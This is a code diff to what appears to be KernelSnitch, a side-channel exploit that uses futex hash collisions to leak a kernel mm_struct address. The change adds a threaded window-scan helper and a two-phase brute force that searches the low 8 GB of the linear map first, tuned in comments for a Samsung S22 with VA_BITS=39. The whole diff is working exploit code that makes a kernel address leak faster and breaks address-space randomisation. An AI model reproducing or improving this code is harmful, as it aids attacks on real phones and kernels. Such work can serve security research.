@@ -351,26 +351,73 @@ size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
  * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
  * @arg ks: shared KernelSnitch state
  */
+/**
+ * Scan one virtual-address window with all workers.
+ * Splits [start, end) across ks->thread_cnt threads and joins them.
+ */
+static void kernelsnitch_scan_window(struct kernelsnitch_shared_state *ks,
+                                     size_t start, size_t end)
+{
+    size_t span = end - start;
+    size_t per = span / ks->thread_cnt;
+
+    for (size_t i = 0; i < ks->thread_cnt; ++i) {
+        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
+        mm_leak_arg->ks = ks;
+        mm_leak_arg->range.id = i;
+        mm_leak_arg->range.start = start + per * i;
+        mm_leak_arg->range.end = (i + 1 == ks->thread_cnt) ? end : start + per * (i + 1);
+        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
+            mm_leak_arg->range.start &= ~(COARSE_SZ - 1);
+        if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
+            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+        if (mm_leak_arg->range.end > end)
+            mm_leak_arg->range.end = end;
+        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
+    }
+    for (size_t i = 0; i < ks->thread_cnt; ++i)
+        pthread_join(ks->tids[i], 0);
+}
+
+/**
+ * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
+ * @arg ks: shared KernelSnitch state
+ *
+ * Two-phase scan: the mm_struct cache normally lives in the first 8 GB of the
+ * linear map (the low RAM bank), so try that window first.  Only when it is not
+ * found there do we scan the rest of the 64 GB VA_BITS=39 direct map (the S22
+ * has a RAM bank above 4 GB, so high addresses are valid).  This cuts the
+ * common-case scan by 8x.
+ */
 void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
     if (ks->verbose) pr_info("start bruteforcing\n");
     reset_cpu_pin();
 
-    for (size_t i = 0; i < ks->thread_cnt; ++i) {
-        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
-        mm_leak_arg->ks = ks;
-        mm_leak_arg->range.id = i;
-        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
-        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
-        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
-            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
-        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
-            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
-        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
+#ifndef KSNITCH_LOW_WINDOW
+#define KSNITCH_LOW_WINDOW (8ULL << 30)
+#endif
+    size_t low_window = KSNITCH_LOW_WINDOW;
+    const char *env = getenv("KSNITCH_LOW_WINDOW");
+    if (env && *env) {
+        unsigned long long v = strtoull(env, NULL, 0);
+        if (v >= (1ULL << 30)) {
+            low_window = (size_t)v;
+        }
     }
-    for (size_t i = 0; i < ks->thread_cnt; ++i)
-        pthread_join(ks->tids[i], 0);
+
+    size_t split = IDENTITY_START + low_window;
+    if (split > IDENTITY_END)
+        split = IDENTITY_END;
+
+    kernelsnitch_scan_window(ks, IDENTITY_START, split);
+    if (ks->mm_struct == (size_t)-1 && split < IDENTITY_END) {
+        if (ks->verbose)
+            pr_info("low window miss, scanning %016zx..%016zx\n", split, (size_t)IDENTITY_END);
+        kernelsnitch_scan_window(ks, split, IDENTITY_END);
+    }
+
     if (ks->verbose)
         pr_info("bruteforce best_match=%zu/%zu cand=%016zx found=%d\n",
                 ks->best_match, ks->collisions - 1, ks->best_cand,
@@ -378,11 +425,6 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
 }
 
-/**
- * Cleanup phase for KernelSnitch
- * @arg ks: shared KernelSnitch state
- * @return the found mm_struct or -1 for not found
- */
 size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
